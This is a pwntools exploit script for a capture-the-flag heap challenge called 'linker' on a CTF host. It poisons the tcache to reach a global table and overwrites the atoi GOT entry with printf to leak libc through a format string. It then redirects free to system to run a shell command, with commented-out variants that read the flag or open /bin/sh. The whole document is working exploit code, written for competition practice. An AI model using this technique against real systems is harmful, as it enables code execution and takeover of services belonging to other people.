from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './linker'
HOST = 'linker.3k.ctf.to'
PORT = 9654 

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def login(size, name):
    r.sendlineafter('size:\n', str(size))
    r.sendlineafter('name:\n', name)

def create(size):
    r.sendlineafter('> ', '1')
    r.sendlineafter('size:\n', str(size))

def edit(idx, content):
    r.sendlineafter('> ', '2')
    r.sendlineafter('index:\n', str(idx))
    r.sendafter('content:\n', content)

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter('index:\n', str(idx))

r = start()

login(8, 'A')
for i in range(8): 
    create(0x68)
    delete(0)

edit(0, p64(0x6020a0+5-8))
create(0x68)
create(0x68)
payload = ''
payload += 'A'*3
payload += flat(0, 0)
payload += p32(0x68) * 4
payload += flat(0, 0)
payload += p32(0x1) * 4
payload += flat(0, 0)
payload += flat(0xdeadbeef, 0x6020ad, elf.got.atoi)
edit(1, payload)
edit(2, p64(elf.plt.printf))

r.sendlineafter('> ', '1')
r.sendafter('index:\n', '%3$p')
leak = int(r.recvuntil('Wrong')[:-5], 16)
base = leak - 0x110191

dbg('leak')
dbg('base')

system = base + 0x4f4e0
atoi = base + 0x40730
if args.D:
    debug(r, [0xcba, 0xbce])
r.sendlineafter('> ', 'aa\x00')
r.sendlineafter('index:\n', 'aa\x00')
r.sendafter('content:\n', p64(atoi))

create(0x68)
create(0x68)
payload = ''
payload += 'A'*3
payload += flat(0, 0)
payload += p32(0x68) * 4
payload += flat(0, 0)
payload += p32(0x1) * 4
payload += flat(0, 0)
payload += flat(elf.got.free, 0x6020ad, elf.got.atoi)
edit(1, payload)
edit(0, p64(system))

create(0x18)
edit(4, '/bin/pwd\x00')
# edit(4, '/bin/cat flag\x00')
delete(4)


# r.sendlineafter('> ', 'aa\x00')
# r.sendlineafter('index:\n', '/bin/sh\x00')


r.interactive()
r.close()
